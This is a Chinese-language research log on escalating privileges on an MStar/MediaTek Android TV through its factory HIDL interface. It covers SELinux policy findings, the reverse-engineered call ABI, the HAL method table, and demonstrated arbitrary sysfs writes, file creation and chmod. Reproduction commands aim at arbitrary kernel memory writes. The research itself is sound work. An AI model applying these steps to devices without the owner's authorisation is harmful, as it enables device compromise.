# 10 — HIDL 工厂接口突破（`IMtkTvFApiSystem`）

**日期**：2026-09-10
**状态**：✅ 接口完全打通，文件类原语实证可用；寄存器/二进制类原语已定位待验

---

## 1. 为什么选中这条路

到阶段 11 为止，我们手上有两个域：

| 域 | uid | 能力 |
|---|---|---|
| `u:r:misysdiagnose:s0` | 0 | DAC 全通，但 MStar 私有设备/SELinux 控制面全被拒 |
| `u:r:system_app:s0` | 1000 | 能打开全部 MStar 私有设备，但不含 kernel/sysfs 写 |

两者都**碰不到内核内存**。而 SELinux 策略里存在第三个域：

```
(allow hal_tv_tvfactory_default sysfs_29_0 (file (ioctl read write getattr lock append map open)))
(allow hal_tv_tvfactory_default mstar_miomap_device (chr_file (ioctl read write getattr lock append map open)))
(allow hal_tv_tvfactory_default mstar_malloc_device (chr_file (ioctl read write getattr lock append map open)))
(allow hal_tv_tvfactory_default mstar_block_device   (blk_file (ioctl read getattr lock map open)))
(allow hal_tv_tvfactory_default kmsg_device_29_0     (chr_file (write open)))
(allow hal_tv_tvfactory_default rootfs_29_0          (dir (write)))
(allow hal_tv_tvfactory_default device_29_0          (dir (write lock add_name remove_name search open)))
(allow hal_tv_tvfactory_default self                 (process (execmem)))
```

`hal_tv_tvfactory_default` 是 **TV 工厂模式的 HAL 服务域**，权限远超前面两个域。

**调用资格**：`system_app` 是策略声明的合法客户端——

```
(typeattributeset hal_tv_tvfactory_client (platform_app_29_0 priv_app_29_0 system_app_29_0))
```

所以 `system_app` 可以 `find` 到 hwservice 并 binder 调用它。

**唯一的执行通道**：`TvService.runSystemCommand`（AIDL code 3）**直接 exec 数据目录里的二进制**，
不经过 `/system/bin/sh`，因此不触发 `domain_auto_trans(system_app, shell_exec, shell)` —— **进程保持 `u:r:system_app:s0`**。

```
[diag] pid=25278 ppid=3890 uid=1000 gid=1000 euid=1000 egid=1000
[diag] SELinux ctx = u:r:system_app:s0      ← 铁证
```

---

## 2. 加载代理库的两个坑

### 2.1 链接器命名空间

`/etc/ld.config.29.txt` 的 `namespace.default.permitted.paths` 只含 `/data`、`/system/...`，
**不含 `/vendor/lib`**。直接 `dlopen("/vendor/lib/vendor.mediatek.tv.mtktvfactory@1.0.so")`
会报：

```
not accessible for the namespace (default)
```

**解法**：用 uid0 通道把 .so 复制到 `system_app_data_file` 目录
（`/data/data/com.mediatek.tv.factory/vendor.mediatek.tv.mtktvfactory@1.0.so`，644），
再从那里 dlopen。

### 2.2 HIDL ABI（反汇编确定，32 位 ARM/Thumb-2）

| 类型 | 大小 | 布局 |
|---|---|---|
| `hidl_string` | **16 B** | `mBuffer@0`(ptr) `mSize@8`(u32) `mOwns@12`(u32) |
| `std::string`（libc++ **ALTERNATE_STRING_LAYOUT**） | **12 B** | 短串：`b[0]=(n<<1)`，数据 `@+1`；长串：`b[0]=(n<<1\|1)`，`size@+4`(u32)，`ptr@+8` |

* `hidl_string` 构造函数在 `libhidlbase` 导出：
  `_ZN7android8hardware11hidl_stringC1EPKc`（另有 C2 变体）。
* `getService(const std::string&, bool) → sp<>` 是 **sret**：
  `getsvc(&ret_sp, &name_std_string, getStub)`。
* **外层 `a_hidl_..._write_file` 有隐藏 sret 返回缓冲**：真实调用约定是
  `wfs(retbuf, self, path, content, b1, b2)`；漏掉 retbuf 会参数错位并崩溃。

---

## 3. `IMtkTvFApiSystem` 完整方法表（19 个）

由 `BpHwMtkTvFApiSystem` 符号反推得出（`readelf -s`）：

| 方法 | 签名 | 用途 |
|---|---|---|
| `write_file` | `(string path, string content, bool, bool)` | 文本写文件 |
| `write_file_byte` | `(string path, hidl_vec<uint8>, string)` | **二进制写文件** |
| `read_file` | `(string path, uint32 off, uint64 size, cb(string,int32))` | **按偏移读文本** |
| `read_file_byte` | `(…, cb(hidl_vec<uint8>,int32))` | **按偏移读二进制** |
| `read_file_one_line` | `(…, cb(string,int32))` | 读一行 |
| `get_file_checksum` | `(string, cb(uint32,int32))` | 校验和 |
| `copy_file` | `(string src, string dst, bool)` | **整文件复制（流式）** |
| `check_file` | `(string)` | 存在性/可打开性 |
| `check_folder` | `(string)` | 目录存在性 |
| `create_file` | `(string)` | 创建文件 |
| `create_folder` | `(string)` | 创建目录 |
| `remove_file` | `(string)` | 删除文件 |
| **`change_file_mode`** | `(string path, uint32 mode)` | **chmod** |
| **`read_reg`** | `(uint32 bank, uint32 off, cb(uint32,int32))` | **读硬件寄存器** |
| **`write_reg`** | `(uint32 bank, uint32 off, uint32 val)` | **写硬件寄存器** |
| `send_cmd_to_factory_svc` | `(enum cmd, string)` | 向 factory_service 发命令 |
| `secure_storage_encrypt_key` | `(string, string, hidl_vec<uint8>)` | 安全存储 |
| `update_system_key` | `(string, bool)` | 更新系统密钥 |
| `get_rtc_time` | `(cb(int64,int32))` | RTC |

> **注意**：所有 "读" 操作都通过 **HIDL callback**（`std::function`）返回数据，
> 客户端必须实现一个 `BnHwBase` 派生对象并交给 libhidlbase 的 `HidlCallback` 机制包装。
> 无 callback 的方法（write_file / copy_file / check_* / change_file_mode / write_reg）实现简单。

---

## 4. 已实证的能力（可复现）

### 4.1 任意 sysfs 写 ✅

```
write_file("/sys/kernel/mm/ksm/run", "1")   → rv=0
copy_file ("/sys/kernel/mm/ksm/run", "/dev/TVIDL_K2")  → 读回 "1"
write_file("/sys/kernel/mm/ksm/run", "0")   → 恢复
```

### 4.2 任意 sysfs/proc 读 ✅（有权限者）

```
copy_file("/sys/devices/system/cpu/online", "/dev/TVIDL_CP1") → "0-3"
copy_file("/proc/cmdline", "/dev/TVIDL_C")                    → 完整内核 cmdline
```

### 4.3 `/dev` 下任意文件创建/写/删除 ✅

```
create_file("/dev/TVIDL_X")            → shell 域可见 -rw------- root root
write_file ("/dev/TVIDL_W","HELLO123") → uid0 通道 cat 读回 "HELLO123"
```

### 4.4 跨块设备读取 ✅

见 [`12-block-device-access.md`](12-block-device-access.md)。

---

## 5. 返回值的意义（重要）

`retbuf` 是 32 字节。**`retbuf[6]`（第 7 个 u32）就是被调 HAL 方法的返回值**：

```
write_file(ksm/run)  → retbuf[6] =  0    成功
write_file(MI_UTIL)  → retbuf[6] = -1    失败
check_file(/proc/cmdline)            → 0
check_file(/dev/block/.../boot)      → -1
change_file_mode(/dev/TVIDL_T3,0222) → 0
```

（早期误以为 retbuf 不可靠，是因为对 `copy_file` 的返回值语义判断错了，
而 `copy_file` 无论成败都可能返回 -1/0 —— 以**目标文件是否落地**为准。）

---

## 6. 未解决 / 下一步

1. **`write_file` 打不开 write-only 节点** → 见 [`11-hal-file-primitives.md`](11-hal-file-primitives.md)。
   这是当前挡住 `MI_UTIL`（任意内核内存写）的直接原因。
2. **HIDL callback 尚未实现** → `read_file` / `read_reg` 用不了，
   导致无法按偏移读整盘 `mmcblk0` 拿内核镜像。
3. **`send_cmd_to_factory_svc` 未探索** → 其内部命令枚举只有 2 个有效值
   （`convert_factory_cmd`: 0→2, 1→4, 其余→-1），值得跟进。

---

## 7. 复现

```bash
# 部署 + 调用（首次）
./tools/hidlrun.sh /sys/kernel/mm/ksm/run 1        # mode 1 = write_file
# 之后可用轻量版
./tools/halrun.sh 1 /sys/kernel/mm/ksm/run 0       # 写
./tools/halrun.sh 2 /sys/kernel/mm/ksm/run /dev/TVIDL_K3   # 读 → /dev，再 uid0 cat
./tools/halrun.sh 3 /proc/cmdline x                # check_file
./tools/halrun.sh 6 /dev/TVIDL_T3 x 438            # chmod 0666
```

`tvhidl` 支持的 mode：

| mode | 行为 |
|---|---|
| 1 | write_file |
| 2 | copy_file |
| 3 | check_file |
| 4 | create_file |
| 5 | remove_file |
| **6** | **change_file_mode(path, mode)** |
| **50** | **批处理：argv[1]=命令文件，逐行写 `/sys/kernel/mik/MI_UTIL`（自动加 `\n`）** |
| **60** | **批处理：逐行 check_file，打印 rv** |
| **61** | **批处理：逐行 check_folder** |
| 99 | 内层 `_hidl_` 自由函数（调试用） |
